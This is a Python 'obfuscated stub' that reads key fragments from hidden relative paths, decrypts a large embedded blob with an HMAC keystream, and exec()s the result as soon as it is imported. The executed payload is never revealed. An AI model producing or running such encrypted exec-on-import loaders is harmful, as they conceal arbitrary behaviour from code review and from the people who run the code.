# Dorayaki Obfuscated Stub
import base64, os, hashlib, hmac
from pathlib import Path

_KEY_PARTS_OBF = ['wtmLlNWM0UzNxYTMykzM4MDNwQTNiBzL2UmZ3YDZ4kDO4IzYkRjNm9iblRGZphmLv4iLv4iLv4iL', 'wtmL0gDNxcTNxIzMkJDMjBjNwU2M0EzL2UmZ3YDZ4kDO4IzYkRjNm9iblRGZphmLv4iLv4iLv4iL', 'wtmLxImZ0YTOxkDO1EGN4YGM4ADO1YzL2UmZ3YDZ4kDO4IzYkRjNm9iblRGZphmLv4iLv4iLv4iL', 'wtmL5EDOkdDMiRjMwEWZmlTNkJmYmJzL2UmZ3YDZ4kDO4IzYkRjNm9iblRGZphmLv4iLv4iLv4iL']
_BLOB_CHUNKS = ['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', '==Q4qwTE0TBNyyeelh3a2uIsejx5Uuecf//rbXJTObc8J3DFf18ncUUUPQ3SIylbDmI+BtfCIQa+6LSlev7IWGl7TwWC7hjghDQmWHgwKvhzvdE75Z3vIfPjU0EYE6i0GeeTZIIRKLHbwhAitIGKhJLRdCP2A6Y44eCt7DFlUbop5e/uJcMKi/fVTN0Zvw90ENEd8aAcVgSTXNTkNmdBx5yDTQSYWpa/CU3jaihKvWeRxTk+2cY2mIoekreF9fY6VxrFyzteowUYr28IwD9GsXnAiUJSdejmyCm7HwPfJpdaU72EpAh+lO9RTulK+M3QCDmVOIF87QKuq52+r3qCn3swNjKcy9ghZK72RO0KPx5DTmJrzbbR4je8MydmvWHGmaRPWhAwkGY91onSp44NFPC0xa8cTVsKCJ5ke2IQtXfgLkinKHswsV2evbDit4iWWi4ZSVMnIj7lgk9PraukK3LsXLGef+UJYp49n+Pc2DR6InJQWmIVwrXIiIgRpnV+I7CeSRe07eaWD0SMsDbP8AcPrPtNtjhU4zo07tAS+dnvmOoDoq2ZoVuFAT7fcjeJkA/6d8ss5xwuQ+U0Ih0co199gH22RJGTIBdfZSqPH6OIEPf9LZpP9ba9D1WChVh/97RuUXwl9IfwAeYiSccbi0th0pNDodslXnRW/swmzr/YXxFzPE9aPmfiHB7LtfSns/cLZ9HL+4fvDlnUyvkvabqJt7NTaaFN2+yYmEaup7OjVPaIV62uNgR82SNWr']

def _rev(s): return s[::-1]
def _read_key_parts():
    parts = []
    # FIX: Resolve relative to this file's directory
    base = Path(__file__).resolve().parent
    for obf in _KEY_PARTS_OBF:
        try:
            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
            p = base.joinpath(rel_path_str).resolve()
            parts.append(base64.b64decode(p.read_text('utf-8')))
        except Exception: pass
    return b''.join(parts)

def _keystream(key, nonce, length):
    out = bytearray(); counter = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
        counter += 1
    return bytes(out[:length])

def _run():
    key = _read_key_parts()
    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
    nonce, ct = blob[:12], blob[12:]
    ks = _keystream(key, nonce, len(ct))
    plain = bytes(a ^ b for a, b in zip(ct, ks))
    try: src = plain.decode('utf-8')
    except: src = plain.decode('latin-1')
    exec(compile(src, __file__, 'exec'), globals())

_run()
